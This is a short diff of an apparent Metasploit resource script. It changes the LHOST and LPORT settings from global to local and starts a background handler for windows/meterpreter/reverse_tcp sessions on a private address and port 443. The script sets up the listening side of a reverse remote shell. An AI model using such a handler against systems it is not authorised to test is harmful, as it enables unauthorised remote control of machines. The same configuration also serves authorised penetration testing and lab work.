@@ -10,8 +10,8 @@ setg PAYLOAD windows/meterpreter/reverse_tcp
 # Set the IP range and port globally
 # Obviously, modify the LHOST value and LPORT if you wish
 
-setg LHOST 192.168.0.129
-setg LPORT 443
+set LHOST 192.168.0.129
+set LPORT 443
 set ExitOnSession false
 exploit -j -z
 
